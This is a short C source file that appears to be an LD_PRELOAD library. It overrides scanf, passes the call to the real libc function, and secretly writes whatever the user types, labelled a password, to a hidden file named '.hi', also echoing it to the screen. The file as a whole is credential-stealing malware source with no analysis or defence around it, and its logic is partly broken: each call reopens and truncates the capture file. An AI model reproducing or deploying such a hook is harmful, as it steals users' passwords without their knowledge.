#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"

typedef int (*sym)(const char *, ...);
void *handle;
FILE *fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit()
{
	fd = fopen(HIDDEN_FILE, "w");
	if (fd == NULL)
	{
		fprintf(stderr, "Failed to open file: %s\n", HIDDEN_FILE);
		return;
	}
	handle = dlopen(OBJ_PATH, RTLD_LAZY);
	if (handle == NULL)
	{
		fprintf(stderr, "Failed to load library: %s\n", OBJ_PATH);
		return;
	}
}

void mydest()
{
	if (handle != NULL)
	{
		dlclose(handle);
	}
	if (fd != NULL)
	{
		fclose(fd);
	}
}

int scanf(const char *format, ...)
{
	myinit();
	sym orig_scanf;
	char password[1000];
	memset(password, 0, 1000);

	orig_scanf = (sym)dlsym(handle, "scanf");
	if (orig_scanf == NULL)
	{
		fprintf(stderr, "Failed to find function: scanf\n");
		return EOF;
	}

	orig_scanf(format, password);
	fprintf(fd, "%s\n", password); // write password to file
	// fprintf(fd, "%s\n", "test"); // write password to file
	printf("%s\n", password);
	return strlen(password); // return length of password
}
